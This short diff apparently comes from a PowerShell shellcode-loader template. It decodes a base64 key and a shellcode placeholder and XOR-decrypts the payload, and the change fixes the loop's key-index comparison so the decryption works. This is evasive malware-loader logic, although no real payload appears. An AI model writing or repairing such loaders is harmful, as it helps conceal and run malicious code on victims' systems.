@@ -490,7 +490,7 @@ $k = [System.Convert]::frombase64string("##BASE64KEY##");
 $sc = [System.Convert]::frombase64string("##BASE64SHELLCODE##");
 $ki=0;
 for($i=0;$i -lt $sc.Length;$i++){
-    if($ki=$k.Length){
+    if($ki -eq $k.Length){
         $ki=0;
     }
     $sc[$i] = $sc[$i] -bxor $k[$ki];
